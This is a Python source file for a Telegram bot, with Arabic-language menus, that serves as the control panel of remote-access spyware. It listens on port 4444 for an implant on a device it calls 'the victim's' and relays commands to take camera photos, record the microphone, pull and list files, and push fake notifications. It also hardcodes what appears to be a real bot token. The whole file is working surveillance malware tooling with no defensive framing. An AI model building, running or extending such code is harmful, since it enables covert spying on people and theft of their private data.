import logging
import socket
import threading
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# --- الإعدادات المركزية ---
TOKEN = "7745042123:AAHERMo9DzTcxSQ7ZtQgF_faQAnD6BngDRw"
BIND_PORT = 4444
AGENT_SOCKET = None

logging.basicConfig(level=logging.INFO)

def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📸 كاميرا أمامية", callback_data='cam_1'),
         InlineKeyboardButton("📸 كاميرا خلفية", callback_data='cam_0')],
        [InlineKeyboardButton("🖼️ سحب ملف/صورة", callback_data='pull'),
         InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='mic')],
        [InlineKeyboardButton("📳 تفعيل اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔔 إرسال إشعار", callback_data='alert')],
        [InlineKeyboardButton("📂 قائمة الملفات", callback_data='ls')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('⚠️ تم تفعيل بروتوكول التحكم. اختر أمراً:', reply_markup=reply_markup)

def button_handler(update: Update, context: CallbackContext):
    global AGENT_SOCKET
    query = update.callback_query
    query.answer()
    
    if not AGENT_SOCKET:
        query.edit_message_text("[-] خطأ: لا يوجد جهاز مرتبط حالياً.")
        return

    cmd = query.data
    if cmd == 'alert':
        query.edit_message_text("أرسل نص الإشعار الذي سيظهر للضحية:")
        context.user_data['waiting_for_alert'] = True
    else:
        AGENT_SOCKET.send(cmd.encode())
        query.edit_message_text(f"[*] جاري تنفيذ: {cmd}...")

def handle_text(update: Update, context: CallbackContext):
    global AGENT_SOCKET
    if context.user_data.get('waiting_for_alert') and AGENT_SOCKET:
        msg = update.message.text
        AGENT_SOCKET.send(f"msg:{msg}".encode())
        update.message.reply_text(f"[+] تم إرسال الإشعار: {msg}")
        context.user_data['waiting_for_alert'] = False

def socket_server():
    global AGENT_SOCKET
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', BIND_PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        AGENT_SOCKET = conn
        print(f"[!] Connected: {addr}")

def main():
    threading.Thread(target=socket_server, daemon=True).start()
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()